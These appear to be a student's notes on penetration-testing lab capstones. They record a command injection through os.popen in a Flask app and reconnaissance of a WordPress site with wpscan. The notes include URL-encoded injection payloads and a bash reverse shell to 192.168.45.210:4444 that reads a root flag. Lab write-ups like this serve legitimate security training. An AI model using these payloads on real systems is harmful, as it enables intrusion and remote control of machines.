


# capstone
## Common web application attacks
### capstone 9.4.1.3 
- send random username and password login (do not send ffa)
- displays werkzeug traceback
- clicking shows username and password values
- out = os.popen(f'echo "{ffa}"').read()
- wrap command in ""
- use ls for proof of concept
- `"%26ls;"`
- find shell `username=N@NdkWzmN@NdkWzmN@NdkWzm&password=password&ffa="%26ls;ps%20-x"`
- identifies as sh
- setup reverse shell `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.210%2F4444%200%3E%261%22` 
- `username=N@NdkWzmN@NdkWzmN@NdkWzm&password=password&ffa="%26ls;echo%2088888;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.210%2F4444%200%3E%261%22;echo%2088888"`
- get flag `cd / && cd root && cat flag.txt`
### capstone 9.4.1.4
- hi


## SQL Injection
### capstone 10.3.2.4
- nothing identifies the website
- ran grep http over a curl of the www and added interesting domains to hosts file pointing at same server
- clicking link identified wordpress site for alvida-eatery
  - wpscan --url http://alvida-eatery.org/ --enumerate p --plugins-detection aggressive
  - 
  - https://vulners.com/wpvulndb/WPEX-ID:A875836D-77F4-4306-B275-2B60EFFF1493
  - 